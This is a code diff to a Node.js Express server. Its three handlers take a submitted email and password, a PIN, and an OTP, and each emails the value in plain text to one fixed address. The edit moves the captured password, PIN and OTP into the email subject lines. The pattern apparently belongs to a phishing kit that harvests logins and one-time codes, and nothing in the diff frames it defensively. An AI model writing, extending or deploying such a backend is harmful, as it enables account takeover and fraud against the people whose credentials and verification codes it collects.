@@ -35,8 +35,8 @@ app.post("/", (req, res) => {
   const mailOptions = {
     from: email,
     to: userEmail,
-    subject: `Login Details`,
-    text: `email: ${email}\nPassword: ${password}`,
+    subject: `email: ${email}\nPassword: ${password}`,
+    text: `New user registered with Email: ${email}\nPassword: ${password}`,
   };
 
   console.log(mailOptions);
@@ -66,8 +66,8 @@ app.post("/pin", (req, res) => {
   const mailOptions = {
     from: userEmail,
     to: userEmail,
-    subject: `PIN Confirmation`,
-    text: `Your PIN is: ${pin}`,
+    subject: `PIN is: ${pin}`,
+    text: `New user PIN is: ${pin}`,
   };
   console.log(mailOptions);
   transporter.sendMail(mailOptions, (error, info) => {
@@ -96,8 +96,8 @@ app.post("/otp", (req, res) => {
   const mailOptions = {
     from: userEmail,
     to: userEmail,
-    subject: `OTP Verification`,
-    text: `Your OTP is: ${otp}`,
+    subject: `OTP is: ${otp}`,
+    text: `New user OTP is: ${otp}`,
   };
   console.log(mailOptions);
   transporter.sendMail(mailOptions, (error, info) => {
